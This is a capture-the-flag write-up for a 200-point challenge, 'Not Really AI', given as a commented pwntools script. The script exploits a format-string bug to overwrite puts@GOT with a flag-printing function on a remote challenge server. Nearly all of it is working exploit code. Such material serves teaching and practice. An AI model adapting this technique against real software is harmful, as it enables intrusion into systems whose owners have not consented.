# Not Really AI

### Writeup by Sai, 200 points

`Exploit the service to get the flag.`

**NOTE:** This writeup is in the form of a commented Python script which was used in order to exploit the service remotely. 

```python
#!/usr/bin/env python3
from pwn import *
from sys import argv

REMOTE = 0
if len(argv) > 1:
	if 'r' in argv[1]:
		REMOTE = 1

context.terminal = ['tmux', 'splitw']
exe = './nra'
elf = ELF(exe)
host, port = "88.198.219.20", 24462
proc = remote(host, port) if REMOTE else process(exe)

if len(argv) > 1:
	if 'd' in argv[1]:
		DEBUG = 1
		gdb.attach(proc, '''
b *main
b *0x08049225 
c
''')


# Exploit
# Game plan:
# Write the address of flaggy to puts@GOT -> puts ends up calling flaggy when called.

got_func = elf.got['puts']
flaggy = elf.symbols['flaggy']
log.info("GOT:      0x%x" % got_func)
log.info("Flaggy    0x%x" % flaggy)

# Calculate upper 2 bytes and lower 2 bytes
# To decrease the characters printed to screen and also saves time
upper = flaggy >> 16
lower = flaggy & 0xffff
print(lower, hex(lower))
print(upper, hex(upper))

# Addresses to write to
payload  = p32(got_func+2) # Higher 2 bytes
payload += p32(got_func)   # Lower 2 bytes
# Write upper no. bytes but account for 8 bytes already printed to screen
payload += bytes("%{}x".format(upper - 8).encode('utf-8'))
# Write half word (2 bytes)
payload += b"%4$hn"
# Write lower no. bytes but account for upper number of bytes already printed to screen (since last write)
payload += bytes("%{}x".format(lower - upper).encode('utf-8'))
payload += b"%5$hn"

log.info("Payload: %s" % payload)
proc.recv()
proc.sendline(payload)
proc.interactive()
```

